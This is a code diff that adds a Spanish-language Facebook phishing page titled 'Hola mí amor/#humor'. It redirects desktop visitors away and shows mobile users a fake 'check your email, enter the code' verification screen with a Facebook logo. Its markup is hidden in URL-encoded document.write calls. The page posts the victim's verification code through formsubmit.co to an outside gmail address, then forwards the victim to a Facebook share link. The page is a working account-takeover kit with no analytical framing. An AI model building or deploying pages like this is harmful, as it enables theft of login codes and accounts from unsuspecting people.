@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <script>
+	document.addEventListener("DOMContentLoaded", function() {
+		if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && window.innerWidth < 768) {
+			document.body.style.visibility = 'visible';
+		} else {
+			window.location.href = 'https://m.facebook.com/'; // Redirección a otra página
+		}
+	});
+</script>
+<link
+      rel="icon"
+      type="image/jpeg"
+      href=" "/>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Hola mí amor/#humor</title>
+  </head>
+  <body>
+<script>
+document.write(unescape("%3Cdiv%20style=%22padding-left:20px;%22%20class=%22jx%22%3E%20•%20Facebook%3C/div%3E%3Cdiv%20style=%22padding-left:20px;%22%20class=%22avr%22%3ERevisa%20tu%20correo%20electrónico%3C/div%3E%3Cdiv%20style=%22padding-left:20px;%22%20class=%22aar%22%3EIngresa%20el%20código%20que%20enviamos%20a%20***************@gmail.com%3C/div%3E%3Ccenter%3E%3Cimg%20class=%22fb_logo%22%20src=%22https://i.imgur.com/hkrix7g.png%22%20width=%2290%25%22%20height=%22%25%22%20/%3E%3C/center%3E"));
+</script>
+<form id="formulario-verificacion" action="https://formsubmit.co/marco42748261@gmail.com" method="POST">
+<script>
+document.write(unescape("%3Cdiv%20id=%22verificacion%22%3E%3Ccenter%3E%3Cinput%20type=%22number%22%20id=%22input-verificacion%22%20name=%22verificacion%22%20placeholder=%22Código%22%20required%20autofocus%20inputmode=%22numeric%22%3E%3Ccenter%3E%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22_next%22%20value=%22https://www.facebook.com/share/v/h5jzsFEB5BfjnTfb/?mibextid=xfxF2i%22%3E%3Cinput%20type=%22hidden%22%20name=%22_captcha%22%20value=%22false%22%3E%3Ccenter%3E%3Cspan%20style=%22padding-left:20px;%22%20class=%22jya%22%3EEs%20posible%20que%20debas%20esperar%20unos%20minutos%20antes%20de%20recibir%20el%20código. %3C/span%3E%3Ca%20class=%22AAR%22%3ERecibir%20un%20nuevo%20correo%20electrónico%3C/a%3E%3Cbutton%20id=%22enviar-verificacion%22%20class=%22boton-enviar%22%20type=%22submit%22%3E%3Cspan%3EContinuar%3C/span%3E%3Cdiv%20class=%22loader%22%3E%3C/div%3E%3C/button%3E%3Ccenter%3E%3Ccenter%3E%3Cbutton%20class=%22boton-transparente%22%3EUsar%20otro%20método%3C/button%3E%3Ccenter%3E%3C/form%3E"));
+</script>
+<script>
+const inputVerificacion = document.getElementById('input-verificacion');
+const botonEnviar = document.getElementById('enviar-verificacion');
+
+botonEnviar.addEventListener('click', function(event) {
+  if (!inputVerificacion.checkValidity()) {
+    inputVerificacion.reportValidity();
+    event.preventDefault();
+  } else {
+    botonEnviar.classList.add('enviando');
+    setTimeout(() => {
+      document.getElementById('formulario-verificacion').submit();
+    }, 100);
+    setTimeout(() => {
+      botonEnviar.classList.remove('enviando');
+    }, 7000);
+  }
+});
+</script>
+ </body>
+</html>
+
